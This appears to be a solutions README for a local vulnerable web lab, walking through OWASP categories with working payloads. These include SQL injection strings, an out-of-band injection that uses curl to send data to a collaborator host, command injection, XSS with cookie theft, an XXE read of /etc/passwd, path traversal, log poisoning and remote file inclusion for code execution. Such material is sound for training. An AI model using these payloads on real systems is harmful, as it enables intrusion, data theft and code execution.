# Lab-solutions
Lab solutions

## Open redirect(BAC)
http://127.0.0.1/bac/openr/index.php?redirect=yoursite</br>

## IDOR
Login to account using username & password</br>
http://127.0.0.1/bac/idor/home.php?acnumber=2233445577  change acnumber value to 2233445566(vertical privesc) to 2233445588(horizantol)</br>

## Cryptographic failure
Fuzz the site</br>
http://127.0.0.1/crypt/FUZZ  you will get secret.db file download it & open it with sqlieditor crack the password using crackstation.net & log in to admin</br>

## Injections
### command
use ; semicolon with ip ex: 127.0.0.1;whoami</br>

### SQLI(put a single quote in ID it returns SQLI error message)
version extract using error based sqli<\br>
1'or 1=1 in (LEFT(version(), 1) = '1')#    - first char 1 in version it returns all columns data</br>
1'or 1=1 in (LEFT(version(), 2) = '10')#   - second char 10 in version it returns all columns data</br>
1'or 1=1 in (LEFT(version(), 3) = '10.')#  - third char 10. in version it returns all columns data</br>
so the version number is 10. so on<\br>

### Union
order by to guess columns</br>
1' order by 3#  upto 3 no errors after 3 error means total columns are 3</br>

### union query to extract data from columns
1'union select null,@@version,null #  getting version</br>
1'union select null,schema_name,null from information_schema.schemata#   -extract databases</br>
1'union select null,table_name,null from information_schema.tables where table_schema='databasenamefromabove'#  -extract tablenames</br>
1'union select null,column_name,null from information_schema.columns where table_schema='databasenamefromabove' and table_name='table_namefromabove'#    </br>
1'union select null,column_name_extractdata,null from tablename#  - get datafrom a specific column

### Boolean(no errors -data disappear based true false condition)
1'and if (1=1, (LEFT(version(), 1) = '1'), 'false')#  -first char is 1 and data  appear</br>
1'and if (1=1, (LEFT(version(), 2) = '10'), 'false')#  - second char is 0 and data appear</br>
so the version is 10<\br>

### delay
1' or sleep(5)#</br>

### OOB sqli
';COPY (SELECT version()) TO PROGRAM 'curl -G burpcollaborator?data=$(cat)'--   you will receive data on your burpcollaborator</br>

## XSS
### Rxss
<script>alert(123)</script></br>
### Sxss
<script>alert(123)</script></br>
### DOM
http://127.0.0.1/inject/xss/dom.html?default=<script>alert(123)</script></br>
### BLind
submit your comment payload(<script>alert(123)</script>) on comments page login to admin panel it will trigger xss</br>
use a cookie stealing payload to steal admin cookie

## Insecure design
go to reset password page & use username admin & bruteforce the OTP it will give a password & login to admin account</br>

## Security misconfiguration
create  a .xml file & add below data then upload it the portal you can see /etc/passwd file contents</br>
***
<!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]>
<root>
&test;
</root>
***

## Vulnerable & outdated components
Fuzz the files & you will find admin endpoint with login page</br>
http://127.0.0.1/wbce/admin/login/  - use admin/password deault creds to login its wbce vulnerable version. exploit it and gain code execution</br>

## identification & Authentication failure
its a input type juggling vulnerability in php</br>
capture login request just replace password= value in body to password[]=randomvalue  you can login to admin account</br>

## software & data integrity failure
login to user account with details on login portal</br>
then you can see JWT on request & response header. just decode it and replace username with admin. encode the JWT & submit. you can all admin data</br>

## Security logging & monitoring
Fuzz for log files you will find access.log file & and the attack is bruteforce you can check logs</br>


## SSRF
http://127.0.0.1/ssrf/index.php?page=burpcollaborator  you can get a dummy secret Authorization header</br>

## Path traversal
http://127.0.0.1/pathtr/index.php?page=../../../../../../etc/passwd</br>

## File inclusion
### LFI
http://127.0.0.1/fileinc/index.php?page=../../../../../var/log/apache2/access.log     - you can access log file. perform log poison to get code exection</br>
then submit your php system function payload using Useragent & access it over access.log and your parameter. you will code execution.</br>

### RFI
host your own server with a php system function based payload and access it through page parameter</br>
http://127.0.0.1/fileinc/index.php?page=http://yourserver/code.php   - it will execute the code.php file & show output on screen</br>
